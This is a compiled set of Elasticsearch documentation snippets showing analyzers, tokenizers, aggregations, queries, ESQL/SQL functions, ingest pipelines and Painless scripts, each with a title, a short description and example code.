TITLE: Keyword Tokenizer with Lowercase Filter
DESCRIPTION: Shows how to combine the keyword tokenizer with the lowercase token filter to normalize an email address. This example demonstrates processing structured data while maintaining its format.

LANGUAGE: console
CODE:
POST _analyze
{
  "tokenizer": "keyword",
  "filter": [ "lowercase" ],
  "text": "john.SMITH@example.COM"
}

LANGUAGE: text
CODE:
[ john.smith@example.com ]

----------------------------------------

TITLE: Executing Simple Fuzzy Query in Elasticsearch
DESCRIPTION: This snippet demonstrates a basic fuzzy query in Elasticsearch. It searches for documents where the 'user.id' field contains terms similar to 'ki'.

LANGUAGE: console
CODE:
GET /_search
{
  "query": {
    "fuzzy": {
      "user.id": {
        "value": "ki"
      }
    }
  }
}

----------------------------------------

TITLE: Indexing Email Data and Performing Adjacency Matrix Aggregation in Elasticsearch
DESCRIPTION: This snippet demonstrates how to index email data and perform an adjacency matrix aggregation to analyze interactions between groups of individuals. It uses the PUT and GET methods to index documents and perform a search with the aggregation.

LANGUAGE: console
CODE:
PUT emails/_bulk?refresh
{ "index" : { "_id" : 1 } }
{ "accounts" : ["hillary", "sidney"]}
{ "index" : { "_id" : 2 } }
{ "accounts" : ["hillary", "donald"]}
{ "index" : { "_id" : 3 } }
{ "accounts" : ["vladimir", "donald"]}

GET emails/_search
{
  "size": 0,
  "aggs" : {
    "interactions" : {
      "adjacency_matrix" : {
        "filters" : {
          "grpA" : { "terms" : { "accounts" : ["hillary", "sidney"] }},
          "grpB" : { "terms" : { "accounts" : ["donald", "mitt"] }},
          "grpC" : { "terms" : { "accounts" : ["vladimir", "nigel"] }}
        }
      }
    }
  }
}

----------------------------------------

TITLE: Basic query_string search in Elasticsearch
DESCRIPTION: Performs a query_string search for '(new york city) OR (big apple)' in the 'content' field.

LANGUAGE: json
CODE:
GET /_search
{
  "query": {
    "query_string": {
      "query": "(new york city) OR (big apple)",
      "default_field": "content"
    }
  }
}

----------------------------------------

TITLE: Querying Elasticsearch with Function Score and Painless Script
DESCRIPTION: This snippet demonstrates a GET request to Elasticsearch using a function score query. It searches for unsold seats and applies a custom score based on the row number, favoring lower row values.

LANGUAGE: json
CODE:
GET /seats/_search
{
  "query": {
    "function_score": {
      "query": {
        "match": {
          "sold": "false"
        }
      },
      "script_score": {
        "script": {
          "source": "1.0 / doc['row'].value"
        }
      }
    }
  }
}

----------------------------------------

TITLE: Transport Version Backport Conditional Checks
DESCRIPTION: Example showing how to implement version checks for backported changes across multiple versions using isPatchFrom and onOrAfter conditions.

LANGUAGE: java
CODE:
if (transportVersion.isPatchFrom(8.13_backport_id)
    || transportVersion.isPatchFrom(8.14_backport_id)
    || transportVersion.onOrAfter(8.15_transport_id))

----------------------------------------

TITLE: Min Aggregation with Histogram Fields in Elasticsearch
DESCRIPTION: Demonstrates using min aggregation with histogram fields to find the minimum value across pre-aggregated histogram data.

LANGUAGE: console
CODE:
PUT metrics_index
{
  "mappings": {
    "properties": {
      "latency_histo": { "type": "histogram" }
    }
  }
}

PUT metrics_index/_doc/1?refresh
{
  "network.name" : "net-1",
  "latency_histo" : {
      "values" : [0.1, 0.2, 0.3, 0.4, 0.5],
      "counts" : [3, 7, 23, 12, 6]
   }
}

PUT metrics_index/_doc/2?refresh
{
  "network.name" : "net-2",
  "latency_histo" : {
      "values" :  [0.1, 0.2, 0.3, 0.4, 0.5],
      "counts" : [8, 17, 8, 7, 6]
   }
}

POST /metrics_index/_search?size=0&filter_path=aggregations
{
  "aggs" : {
    "min_latency" : { "min" : { "field" : "latency_histo" } }
  }
}

----------------------------------------

TITLE: Analyzing Text with Character Group Tokenizer in Elasticsearch
DESCRIPTION: Example of using the char_group tokenizer to break text on whitespace, hyphens and newlines. The tokenizer is configured with tokenize_on_chars parameter specifying the delimiting characters.

LANGUAGE: console
CODE:
POST _analyze
{
  "tokenizer": {
    "type": "char_group",
    "tokenize_on_chars": [
      "whitespace",
      "-",
      "\n"
    ]
  },
  "text": "The QUICK brown-fox"
}

LANGUAGE: console-result
CODE:
{
  "tokens": [
    {
      "token": "The",
      "start_offset": 0,
      "end_offset": 3,
      "type": "word",
      "position": 0
    },
    {
      "token": "QUICK",
      "start_offset": 4,
      "end_offset": 9,
      "type": "word",
      "position": 1
    },
    {
      "token": "brown",
      "start_offset": 10,
      "end_offset": 15,
      "type": "word",
      "position": 2
    },
    {
      "token": "fox",
      "start_offset": 16,
      "end_offset": 19,
      "type": "word",
      "position": 3
    }
  ]
}

----------------------------------------

TITLE: Basic Filter Aggregation Example
DESCRIPTION: Demonstrates how to calculate average prices using filter aggregation to narrow results to t-shirts only, comparing with overall average price.

LANGUAGE: console
CODE:
POST /sales/_search?size=0&filter_path=aggregations
{
  "aggs": {
    "avg_price": { "avg": { "field": "price" } },
    "t_shirts": {
      "filter": { "term": { "type": "t-shirt" } },
      "aggs": {
        "avg_price": { "avg": { "field": "price" } }
      }
    }
  }
}

LANGUAGE: console-result
CODE:
{
  "aggregations": {
    "avg_price": { "value": 140.71428571428572 },
    "t_shirts": {
      "doc_count": 3,
      "avg_price": { "value": 128.33333333333334 }
    }
  }
}

----------------------------------------

TITLE: Creating Custom Analyzer with Edge N-gram Filter in Elasticsearch
DESCRIPTION: This example shows how to use the create index API to configure a new custom analyzer that incorporates the edge_ngram filter.

LANGUAGE: console
CODE:
PUT edge_ngram_example
{
  "settings": {
    "analysis": {
      "analyzer": {
        "standard_edge_ngram": {
          "tokenizer": "standard",
          "filter": [ "edge_ngram" ]
        }
      }
    }
  }
}

----------------------------------------

TITLE: Querying Multiple Indices with Elasticsearch Multi-Target Syntax in SQL
DESCRIPTION: Demonstrates how to use Elasticsearch multi-target syntax to show tables and query multiple indices. This syntax allows for both inclusion and exclusion of indices based on patterns.

LANGUAGE: sql
CODE:
SHOW TABLES "*,-l*";

LANGUAGE: sql
CODE:
SELECT emp_no FROM "e*p" LIMIT 1;

LANGUAGE: sql
CODE:
SELECT emp_no FROM "my*cluster:*emp" LIMIT 1;

----------------------------------------

TITLE: Analyzing Text with Edge N-gram Filter in Elasticsearch
DESCRIPTION: This snippet demonstrates how to use the analyze API with the edge_ngram filter to convert a text into 1-character and 2-character edge n-grams.

LANGUAGE: console
CODE:
GET _analyze
{
  "tokenizer": "standard",
  "filter": [
    { "type": "edge_ngram",
      "min_gram": 1,
      "max_gram": 2
    }
  ],
  "text": "the quick brown fox jumps"
}

----------------------------------------

TITLE: Configuring Fail Processor in Elasticsearch Ingest Pipeline
DESCRIPTION: This snippet demonstrates how to configure a Fail processor in an Elasticsearch ingest pipeline. It checks if the 'production' tag is not present and raises an exception with a custom error message if the condition is met.

LANGUAGE: json
CODE:
{
  "fail": {
    "if" : "ctx.tags.contains('production') != true",
    "message": "The production tag is not present, found tags: {{{tags}}}"
  }
}

----------------------------------------

TITLE: Disabling Doc Values in Elasticsearch Mapping
DESCRIPTION: Example demonstrating how to disable doc_values for fields where sorting and aggregations aren't needed. Shows configuration for both default doc_values behavior and explicit disabling to save disk space.

LANGUAGE: console
CODE:
PUT my-index-000001
{
  "mappings": {
    "properties": {
      "status_code": {
        "type":       "keyword"
      },
      "session_id": {
        "type":       "keyword",
        "doc_values": false
      }
    }
  }
}

----------------------------------------

TITLE: Executing an Intervals Query in Elasticsearch
DESCRIPTION: This example demonstrates an Intervals query that searches for 'my favorite food' followed by either 'hot water' or 'cold porridge' in the 'my_text' field.

LANGUAGE: console
CODE:
POST _search
{
  "query": {
    "intervals" : {
      "my_text" : {
        "all_of" : {
          "ordered" : true,
          "intervals" : [
            {
              "match" : {
                "query" : "my favorite food",
                "max_gaps" : 0,
                "ordered" : true
              }
            },
            {
              "any_of" : {
                "intervals" : [
                  { "match" : { "query" : "hot water" } },
                  { "match" : { "query" : "cold porridge" } }
                ]
              }
            }
          ]
        }
      }
    }
  }
}

----------------------------------------

TITLE: Configuring and Using Rank Features in Elasticsearch
DESCRIPTION: Demonstrates how to configure rank_features fields in mappings and index documents with feature vectors. Shows usage of both positive and negative scoring features, along with different query examples for ranking documents based on these features.

LANGUAGE: console
CODE:
PUT my-index-000001
{
  "mappings": {
    "properties": {
      "topics": {
        "type": "rank_features"
      },
      "negative_reviews" : {
        "type": "rank_features",
        "positive_score_impact": false
      }
    }
  }
}

PUT my-index-000001/_doc/1
{
  "topics": {
    "politics": 20,
    "economics": 50.8
  },
  "negative_reviews": {
    "1star": 10,
    "2star": 100
  }
}

PUT my-index-000001/_doc/2
{
  "topics": {
    "politics": 5.2,
    "sports": 80.1
  },
  "negative_reviews": {
    "1star": 1,
    "2star": 10
  }
}

GET my-index-000001/_search
{
  "query": {
    "rank_feature": {
      "field": "topics.politics"
    }
  }
}

GET my-index-000001/_search
{
  "query": {
    "rank_feature": {
      "field": "negative_reviews.1star"
    }
  }
}

GET my-index-000001/_search
{
  "query": {
    "term": {
      "topics": "economics"
    }
  }
}

----------------------------------------

TITLE: HISTOGRAM Function Syntax
DESCRIPTION: Basic syntax for the HISTOGRAM function showing both numeric and date/time variants with their required parameters.

LANGUAGE: sql
CODE:
HISTOGRAM(
    numeric_exp,        
    numeric_interval)   

HISTOGRAM(
    date_exp,           
    date_time_interval) 

----------------------------------------

TITLE: Creating a MySQL Connector via Elasticsearch API
DESCRIPTION: This snippet demonstrates how to create a new self-managed MySQL connector using the Elasticsearch Create connector API.

LANGUAGE: JSON
CODE:
PUT _connector/my-mysql-connector
{
  "index_name": "my-elasticsearch-index",
  "name": "Content synced from MySQL",
  "service_type": "mysql"
}

----------------------------------------

TITLE: Configuring German Phonebook Order Sorting using ICU Collation
DESCRIPTION: Example demonstrating how to configure an index with ICU collation keyword field for sorting German names in phonebook order. The configuration includes a text field for full-text search and a specialized sort field using German phonebook collation rules.

LANGUAGE: console
CODE:
PUT my-index-000001
{
  "mappings": {
    "properties": {
      "name": {
        "type": "text",
        "fields": {
          "sort": {
            "type": "icu_collation_keyword",
            "index": false,
            "language": "de",
            "country": "DE",
            "variant": "@collation=phonebook"
          }
        }
      }
    }
  }
}

GET /my-index-000001/_search
{
  "query": {
    "match": {
      "name": "Fritz"
    }
  },
  "sort": "name.sort"
}

----------------------------------------

TITLE: Custom Pattern Definitions in Grok Processor
DESCRIPTION: Shows how to define custom Grok patterns using the pattern_definitions option. Includes examples for matching specific dog breeds and RGB colors.

LANGUAGE: js
CODE:
{
  "description" : "...",
  "processors": [
    {
      "grok": {
        "field": "message",
        "patterns": ["my %{FAVORITE_DOG:dog} is colored %{RGB:color}"],
        "pattern_definitions" : {
          "FAVORITE_DOG" : "beagle",
          "RGB" : "RED|GREEN|BLUE"
        }
      }
    }
  ]
}

----------------------------------------

TITLE: Initializing and Querying Geohex Grid Aggregation in Elasticsearch
DESCRIPTION: This snippet demonstrates how to create an index with geo_point data, insert sample museum locations, and perform a low-precision geohex_grid aggregation query.

LANGUAGE: console
CODE:
PUT /museums
{
  "mappings": {
    "properties": {
      "location": {
        "type": "geo_point"
      }
    }
  }
}

POST /museums/_bulk?refresh
{"index":{"_id":1}}
{"location": "POINT (4.912350 52.374081)", "name": "NEMO Science Museum"}
{"index":{"_id":2}}
{"location": "POINT (4.901618 52.369219)", "name": "Museum Het Rembrandthuis"}
{"index":{"_id":3}}
{"location": "POINT (4.914722 52.371667)", "name": "Nederlands Scheepvaartmuseum"}
{"index":{"_id":4}}
{"location": "POINT (4.405200 51.222900)", "name": "Letterenhuis"}
{"index":{"_id":5}}
{"location": "POINT (2.336389 48.861111)", "name": "Musée du Louvre"}
{"index":{"_id":6}}
{"location": "POINT (2.327000 48.860000)", "name": "Musée d'Orsay"}

POST /museums/_search?size=0
{
  "aggregations": {
    "large-grid": {
      "geohex_grid": {
        "field": "location",
        "precision": 4
      }
    }
  }
}

----------------------------------------

TITLE: Configuring Global and Field-Specific Highlighting Settings
DESCRIPTION: Demonstrates how to set global highlighting options and override them for specific fields.

LANGUAGE: console
CODE:
GET /_search
{
  "query" : {
    "match": { "user.id": "kimchy" }
  },
  "highlight" : {
    "number_of_fragments" : 3,
    "fragment_size" : 150,
    "fields" : {
      "body" : { "pre_tags" : ["<em>"], "post_tags" : ["</em>"] },
      "blog.title" : { "number_of_fragments" : 0 },
      "blog.author" : { "number_of_fragments" : 0 },
      "blog.comment" : { "number_of_fragments" : 5, "order" : "score" }
    }
  }
}

----------------------------------------

TITLE: Using INSERT Function in Elasticsearch SQL
DESCRIPTION: Inserts a replacement string into a source string at a specified position. The resulting string cannot exceed 1 MB in byte length.

LANGUAGE: sql
CODE:
SELECT INSERT('Elastic ', 8, 1, 'search');

INSERT('Elastic ', 8, 1, 'search')
----------------------------------
Elasticsearch

----------------------------------------

TITLE: Analyzing Text with Conditional Token Filter in Elasticsearch
DESCRIPTION: This example uses the analyze API to apply a conditional token filter. It matches tokens with fewer than 5 characters and converts them to lowercase.

LANGUAGE: console
CODE:
GET /_analyze
{
  "tokenizer": "standard",
  "filter": [
    {
      "type": "condition",
      "filter": [ "lowercase" ],
      "script": {
        "source": "token.getTerm().length() < 5"
      }
    }
  ],
  "text": "THE QUICK BROWN FOX"
}

----------------------------------------

TITLE: Histogram Aggregation with Extended Bounds in Elasticsearch
DESCRIPTION: Elasticsearch query demonstrating the use of 'extended_bounds' to force the creation of buckets within a specific range, even if no documents fall within those buckets.

LANGUAGE: json
CODE:
POST /sales/_search?size=0
{
  "query": {
    "constant_score": { "filter": { "range": { "price": { "lte": "500" } } } }
  },
  "aggs": {
    "prices": {
      "histogram": {
        "field": "price",
        "interval": 50,
        "extended_bounds": {
          "min": 0,
          "max": 500
        }
      }
    }
  }
}

----------------------------------------

TITLE: Calculating Distance Between Airport and City Locations Using ST_DISTANCE in Elasticsearch SQL
DESCRIPTION: This SQL query demonstrates the usage of the ST_DISTANCE function in Elasticsearch. It selects data from an 'airports' index, filters for a specific airport (CPH), calculates the distance between the airport's location and the city's location, and returns relevant fields including the calculated distance.

LANGUAGE: sql
CODE:
FROM airports
| WHERE abbrev == "CPH"
| EVAL distance = ST_DISTANCE(location, city_location)
| KEEP abbrev, name, location, city_location, distance

----------------------------------------

TITLE: Using CASE Function in Elasticsearch SQL Query
DESCRIPTION: Demonstrates how to use the CASE function to categorize employees based on the number of languages they speak. The function evaluates conditions sequentially and returns the first matching value, with a default fallback value for non-matching cases.

LANGUAGE: sql
CODE:
FROM employees
| EVAL type = CASE(
    languages <= 1, "monolingual",
    languages <= 2, "bilingual",
     "polyglot")
| KEEP emp_no, languages, type

----------------------------------------

TITLE: Defining Script Structure in Elasticsearch Painless
DESCRIPTION: Describes the composition of scripts in Elasticsearch's Painless language, mentioning that scripts consist of one or more statements and are executed within a sandbox environment that controls variable access and API permissions.

LANGUAGE: markdown
CODE:
# Scripts [painless-scripts]

Scripts are composed of one-to-many [statements](/reference/scripting-languages/painless/painless-statements.md) and are run in a sandbox that determines what local variables are immediately available along with what APIs are allowed.

----------------------------------------

TITLE: Calculating Percentiles for Monthly Sales in Elasticsearch
DESCRIPTION: Shows how to calculate percentiles for total monthly sales buckets using a date histogram and sum aggregation, followed by a percentiles_bucket aggregation. It specifies custom percentiles to calculate.

LANGUAGE: console
CODE:
POST /sales/_search
{
  "size": 0,
  "aggs": {
    "sales_per_month": {
      "date_histogram": {
        "field": "date",
        "calendar_interval": "month"
      },
      "aggs": {
        "sales": {
          "sum": {
            "field": "price"
          }
        }
      }
    },
    "percentiles_monthly_sales": {
      "percentiles_bucket": {
        "buckets_path": "sales_per_month>sales",
        "percents": [ 25.0, 50.0, 75.0 ]
      }
    }
  }
}

----------------------------------------

TITLE: Field Collapse Example with Top Hits in Elasticsearch
DESCRIPTION: This example shows how to implement field collapsing or result grouping using a terms aggregator on the domain field, combined with a top_hits sub-aggregator to collect top matching hits per bucket.

LANGUAGE: json
CODE:
{
  "query": {
    "match": {
      "body": "elections"
    }
  },
  "aggs": {
    "top_sites": {
      "terms": {
        "field": "domain",
        "order": {
          "top_hit": "desc"
        }
      },
      "aggs": {
        "top_tags_hits": {
          "top_hits": {}
        },
        "top_hit" : {
          "max": {
            "script": {
              "source": "_score"
            }
          }
        }
      }
    }
  }
}

----------------------------------------

TITLE: Cardinality Aggregation with Precision Control in Elasticsearch
DESCRIPTION: Shows how to use the precision_threshold option in cardinality aggregation to trade memory for accuracy. The threshold is set to 100, affecting the accuracy of counts above this value.

LANGUAGE: console
CODE:
POST /sales/_search?size=0
{
  "aggs": {
    "type_count": {
      "cardinality": {
        "field": "type",
        "precision_threshold": 100
      }
    }
  }
}

----------------------------------------

TITLE: Extracting Year from Date using DATE_EXTRACT in Elasticsearch ESQL
DESCRIPTION: This snippet demonstrates how to use the DATE_EXTRACT function to extract the year from a date in Elasticsearch ESQL. It first parses a date string into a date object using DATE_PARSE, then extracts the year component using DATE_EXTRACT.

LANGUAGE: sql
CODE:
ROW date = DATE_PARSE("yyyy-MM-dd", "2022-05-06")
| EVAL year = DATE_EXTRACT("year", date)

----------------------------------------

TITLE: Using QUERY Function in Elasticsearch SQL
DESCRIPTION: The QUERY function provides control over the query_string query in Elasticsearch. It accepts a query string and optional parameters for customization.

LANGUAGE: sql
CODE:
QUERY(
    constant_exp <1>
    [, options]) <2>

LANGUAGE: sql
CODE:
SELECT author, name, SCORE() FROM library WHERE QUERY('name:dune');

LANGUAGE: sql
CODE:
SELECT author, name, page_count, SCORE() FROM library WHERE QUERY('_exists_:"author" AND page_count:>200 AND (name:/star.*/ OR name:duna~)');

LANGUAGE: sql
CODE:
SELECT author, name, SCORE() FROM library WHERE QUERY('dune god', 'default_operator=and;default_field=name');

----------------------------------------

TITLE: Configuring Custom N-gram Tokenizer in Elasticsearch
DESCRIPTION: Example showing how to configure a custom N-gram tokenizer with tri-grams and specific token character classes for letters and digits

LANGUAGE: console
CODE:
PUT my-index-000001
{
  "settings": {
    "analysis": {
      "analyzer": {
        "my_analyzer": {
          "tokenizer": "my_tokenizer"
        }
      },
      "tokenizer": {
        "my_tokenizer": {
          "type": "ngram",
          "min_gram": 3,
          "max_gram": 3,
          "token_chars": [
            "letter",
            "digit"
          ]
        }
      }
    }
  }
}

POST my-index-000001/_analyze
{
  "analyzer": "my_analyzer",
  "text": "2 Quick Foxes."
}

LANGUAGE: text
CODE:
[ Qui, uic, ick, Fox, oxe, xes ]

----------------------------------------

TITLE: Basic Exists Query in Elasticsearch
DESCRIPTION: Demonstrates how to use the exists query to find documents where a specific field has an indexed value. The query checks for the existence of the 'user' field.

LANGUAGE: console
CODE:
GET /_search
{
  "query": {
    "exists": {
      "field": "user"
    }
  }
}

----------------------------------------

TITLE: Keyword Analyzer Output Example
DESCRIPTION: Shows the output produced by the keyword analyzer, demonstrating how it keeps the entire input as a single token.

LANGUAGE: text
CODE:
[ The 2 QUICK Brown-Foxes jumped over the lazy dog's bone. ]

----------------------------------------

TITLE: Executing Range Aggregation in Elasticsearch
DESCRIPTION: Demonstrates how to perform a range aggregation on the 'price' field, defining buckets for different price ranges.

LANGUAGE: console
CODE:
GET sales/_search
{
  "aggs": {
    "price_ranges": {
      "range": {
        "field": "price",
        "ranges": [
          { "to": 100.0 },
          { "from": 100.0, "to": 200.0 },
          { "from": 200.0 }
        ]
      }
    }
  }
}

----------------------------------------

TITLE: Sample Connector Configuration
DESCRIPTION: YAML configuration for connecting to Elasticsearch with Docker

LANGUAGE: yaml
CODE:
elasticsearch.host: http://host.docker.internal:9200
elasticsearch.api_key: <ELASTICSEARCH_API_KEY>

connectors:
  -
    connector_id: <CONNECTOR_ID_FROM_KIBANA>
    service_type: confluence
    api_key: <CONNECTOR_API_KEY_FROM_KIBANA>

----------------------------------------

TITLE: Intervals Query with Script Filter
DESCRIPTION: This example demonstrates an Intervals query using a script filter to match intervals based on their start position, end position, and internal gap count.

LANGUAGE: console
CODE:
POST _search
{
  "query": {
    "intervals" : {
      "my_text" : {
        "match" : {
          "query" : "hot porridge",
          "filter" : {
            "script" : {
              "source" : "interval.start > 10 && interval.end < 20 && interval.gaps == 0"
            }
          }
        }
      }
    }
  }
}

----------------------------------------

TITLE: Setting ignore_malformed at Index Level in Elasticsearch
DESCRIPTION: This example shows how to set ignore_malformed at the index level, affecting all fields by default. It also demonstrates how to override this setting for a specific field.

LANGUAGE: console
CODE:
PUT my-index-000001
{
  "settings": {
    "index.mapping.ignore_malformed": true
  },
  "mappings": {
    "properties": {
      "number_one": {
        "type": "byte"
      },
      "number_two": {
        "type": "integer",
        "ignore_malformed": false
      }
    }
  }
}

----------------------------------------

TITLE: Creating a Custom Analyzer with CJK Width Token Filter in Elasticsearch
DESCRIPTION: This example shows how to use the create index API to configure a new custom analyzer that includes the CJK width token filter.

LANGUAGE: json
CODE:
PUT /cjk_width_example
{
  "settings": {
    "analysis": {
      "analyzer": {
        "standard_cjk_width": {
          "tokenizer": "standard",
          "filter": [ "cjk_width" ]
        }
      }
    }
  }
}

----------------------------------------

TITLE: Custom Document Routing Example
DESCRIPTION: Demonstrates how to index and retrieve a document using a custom routing value instead of the default document ID.

LANGUAGE: console
CODE:
PUT my-index-000001/_doc/1?routing=user1&refresh=true
{
  "title": "This is a document"
}

GET my-index-000001/_doc/1?routing=user1

----------------------------------------

TITLE: Defining Input Parameter for Elasticsearch Function Test
DESCRIPTION: This snippet defines the 'input' parameter for an Elasticsearch function test case. It specifies that 'input' is the input to be hashed.

LANGUAGE: markdown
CODE:
`input`
:   Input to hash.

----------------------------------------

TITLE: GeoIP Pipeline with Country Database
DESCRIPTION: Example showing how to create a pipeline using the GeoLite2-Country database and storing results in a custom target field.

LANGUAGE: console
CODE:
PUT _ingest/pipeline/geoip
{
  "description" : "Add ip geolocation info",
  "processors" : [
    {
      "geoip" : {
        "field" : "ip",
        "target_field" : "geo",
        "database_file" : "GeoLite2-Country.mmdb"
      }
    }
  ]
}

----------------------------------------

TITLE: Updating Players with 'b' in Last Name Using Painless Regex
DESCRIPTION: This snippet shows how to use a Painless script with regular expressions to update documents where the last name contains the letter 'b'.

LANGUAGE: console
CODE:
POST hockey/_update_by_query
{
  "script": {
    "lang": "painless",
    "source": """
      if (ctx._source.last =~ /b/) {
        ctx._source.last += "matched";
      } else {
        ctx.op = "noop";
      }
    """
  }
}

----------------------------------------

TITLE: Code Pattern Analysis Configuration
DESCRIPTION: Elasticsearch configuration for analyzing camelCase code patterns using pattern_capture filter.

LANGUAGE: console
CODE:
PUT test
{
   "settings" : {
      "analysis" : {
         "filter" : {
            "code" : {
               "type" : "pattern_capture",
               "preserve_original" : true,
               "patterns" : [
                  "(\\p{Ll}+|\\p{Lu}\\p{Ll}+|\\p{Lu}+)",
                  "(\\d+)"
               ]
            }
         },
         "analyzer" : {
            "code" : {
               "tokenizer" : "pattern",
               "filter" : [ "code", "lowercase" ]
            }
         }
      }
   }
}

----------------------------------------

TITLE: Customizing Whitespace Analyzer in Elasticsearch
DESCRIPTION: This snippet demonstrates how to create a custom analyzer based on the whitespace analyzer. It creates an index with a custom analyzer named 'rebuilt_whitespace' using the whitespace tokenizer and allows for additional token filters.

LANGUAGE: console
CODE:
PUT /whitespace_example
{
  "settings": {
    "analysis": {
      "analyzer": {
        "rebuilt_whitespace": {
          "tokenizer": "whitespace",
          "filter": [         <1>
          ]
        }
      }
    }
  }
}

----------------------------------------

TITLE: Using DATE_ADD Function
DESCRIPTION: Examples of using DATE_ADD function to add or subtract time units from dates and times.

LANGUAGE: sql
CODE:
SELECT DATE_ADD('years', 10, '2019-09-04T11:22:33.000Z'::datetime) AS "+10 years";

LANGUAGE: sql
CODE:
SELECT DATE_ADD('week', 10, '2019-09-04T11:22:33.000Z'::datetime) AS "+10 weeks";

LANGUAGE: sql
CODE:
SELECT DATE_ADD('seconds', -1234, '2019-09-04T11:22:33.000Z'::datetime) AS "-1234 seconds";

LANGUAGE: sql
CODE:
SELECT DATE_ADD('qq', -417, '2019-09-04'::date) AS "-417 quarters";

LANGUAGE: sql
CODE:
SELECT DATE_ADD('minutes', 9235, '2019-09-04'::date) AS "+9235 minutes";

----------------------------------------

TITLE: Querying Books with KQL Function in Elasticsearch ESQL
DESCRIPTION: This snippet demonstrates how to use the KQL function in an ESQL query to filter books by author. It selects books authored by Faulkner, keeps specific fields, sorts the results, and limits the output.

LANGUAGE: sql
CODE:
FROM books
| WHERE KQL("author: Faulkner")
| KEEP book_no, author
| SORT book_no
| LIMIT 5

----------------------------------------

TITLE: Configuring Pattern Replace Filter for Number Format
DESCRIPTION: Example showing how to configure a pattern_replace character filter to replace dashes in numbers with underscores using regular expressions.

LANGUAGE: console
CODE:
PUT my-index-000001
{
  "settings": {
    "analysis": {
      "analyzer": {
        "my_analyzer": {
          "tokenizer": "standard",
          "char_filter": [
            "my_char_filter"
          ]
        }
      },
      "char_filter": {
        "my_char_filter": {
          "type": "pattern_replace",
          "pattern": "(\\d+)-(?=\\d)",
          "replacement": "$1_"
        }
      }
    }
  }
}

POST my-index-000001/_analyze
{
  "analyzer": "my_analyzer",
  "text": "My credit card is 123-456-789"
}

----------------------------------------

TITLE: Configuring Field Similarity in Elasticsearch Index Mapping
DESCRIPTION: Example showing how to configure different similarity algorithms for text fields when creating an Elasticsearch index. Demonstrates setting default BM25 similarity and custom boolean similarity on different fields.

LANGUAGE: json
CODE:
PUT my-index-000001
{
  "mappings": {
    "properties": {
      "default_field": {
        "type": "text"
      },
      "boolean_sim_field": {
        "type": "text",
        "similarity": "boolean"
      }
    }
  }
}

----------------------------------------

TITLE: Querying Books by Author in ESQL for Elasticsearch
DESCRIPTION: This ESQL query searches for books with an author matching 'gabriel', retains only the book number and title fields, and limits the results to 3 entries. It demonstrates the use of TERM for exact matching, KEEP for field selection, and LIMIT for result restriction.

LANGUAGE: esql
CODE:
FROM books
| WHERE TERM(author, "gabriel")
| KEEP book_no, title
| LIMIT 3

----------------------------------------

TITLE: Executing Cartesian-centroid Aggregation on Point Field
DESCRIPTION: This snippet demonstrates how to perform a cartesian-centroid aggregation on a point field for all documents in the index.

LANGUAGE: console
CODE:
POST /museums/_search?size=0
{
  "aggs": {
    "centroid": {
      "cartesian_centroid": {
        "field": "location"
      }
    }
  }
}

----------------------------------------

TITLE: Creating Monthly Index Pipeline in Elasticsearch
DESCRIPTION: Example of creating an ingest pipeline that routes documents to monthly indices based on a date field. The pipeline uses the date_index_name processor to generate index names with a prefix and monthly date rounding.

LANGUAGE: console
CODE:
PUT _ingest/pipeline/monthlyindex
{
  "description": "monthly date-time index naming",
  "processors" : [
    {
      "date_index_name" : {
        "field" : "date1",
        "index_name_prefix" : "my-index-",
        "date_rounding" : "M"
      }
    }
  ]
}

----------------------------------------

TITLE: Calculating Total Goals Using Painless in Function Score Query
DESCRIPTION: This snippet shows how to use a Painless script to calculate a player's total goals within a function score query.

LANGUAGE: console
CODE:
GET hockey/_search
{
  "query": {
    "function_score": {
      "script_score": {
        "script": {
          "lang": "painless",
          "source": """
            int total = 0;
            for (int i = 0; i < doc['goals'].length; ++i) {
              total += doc['goals'][i];
            }
            return total;
          """
        }
      }
    }
  }
}

----------------------------------------

TITLE: Analyzing Text with Stop Filter in Elasticsearch
DESCRIPTION: This example demonstrates using the Stop filter to remove stop words 'a' and 'the' from the input text using the Analyze API.

LANGUAGE: console
CODE:
GET /_analyze
{
  "tokenizer": "standard",
  "filter": [ "stop" ],
  "text": "a quick fox jumps over the lazy dog"
}

LANGUAGE: text
CODE:
[ quick, fox, jumps, over, lazy, dog ]

----------------------------------------

TITLE: Basic Top Metrics Aggregation Example
DESCRIPTION: Demonstrates basic usage of top_metrics aggregation to select the value of field 'm' from the document with the largest value of 's'.

LANGUAGE: console
CODE:
POST /test/_bulk?refresh
{"index": {}}
{"s": 1, "m": 3.1415}
{"index": {}}
{"s": 2, "m": 1.0}
{"index": {}}
{"s": 3, "m": 2.71828}
POST /test/_search?filter_path=aggregations
{
  "aggs": {
    "tm": {
      "top_metrics": {
        "metrics": {"field": "m"},
        "sort": {"s": "desc"}
      }
    }
  }
}

----------------------------------------

TITLE: Public Callers Finder Output Examples - CSV Format
DESCRIPTION: Example output from the tool showing the CSV format with tab-separated columns including module name, file details, method information, and caller details.

LANGUAGE: text
CODE:
java.base	DeleteOnExitHook.java	50	java/io/DeleteOnExitHook$1	run	()V	PUBLIC	java.base	java/io/File	delete	PUBLIC
java.base	ZipFile.java	254	java/util/zip/ZipFile	<init>	(Ljava/io/File;ILjava/nio/charset/Charset;)V	PUBLIC	java.base	java/io/File	delete	PUBLIC
java.logging	FileHandler.java	279	java/util/logging/FileHandler	<init>	()V	PUBLIC	java.base	java/io/File	delete	PUBLIC

----------------------------------------

TITLE: Intervals Query with Filter Rule
DESCRIPTION: This example shows an Intervals query that searches for 'hot' and 'porridge' within 10 positions, excluding results where 'salty' appears between them.

LANGUAGE: console
CODE:
POST _search
{
  "query": {
    "intervals" : {
      "my_text" : {
        "match" : {
          "query" : "hot porridge",
          "max_gaps" : 10,
          "filter" : {
            "not_containing" : {
              "match" : {
                "query" : "salty"
              }
            }
          }
        }
      }
    }
  }
}

----------------------------------------

TITLE: Searching Books by Author Name using MATCH in ESQL
DESCRIPTION: ESQL query that searches for books by author containing 'Faulkner', limiting to 5 results and sorting by book number. The query keeps only the book_no and author fields in the output.

LANGUAGE: esql
CODE:
FROM books
| WHERE MATCH(author, "Faulkner")
| KEEP book_no, author
| SORT book_no
| LIMIT 5

----------------------------------------

TITLE: Indexing Parent Documents with Join Field in Elasticsearch
DESCRIPTION: This example demonstrates how to index parent documents using the join field. It shows two ways to specify the relation: using an object notation and a simpler string notation.

LANGUAGE: console
CODE:
PUT my-index-000001/_doc/1?refresh
{
  "my_id": "1",
  "text": "This is a question",
  "my_join_field": {
    "name": "question"
  }
}

PUT my-index-000001/_doc/2?refresh
{
  "my_id": "2",
  "text": "This is another question",
  "my_join_field": "question"
}

----------------------------------------

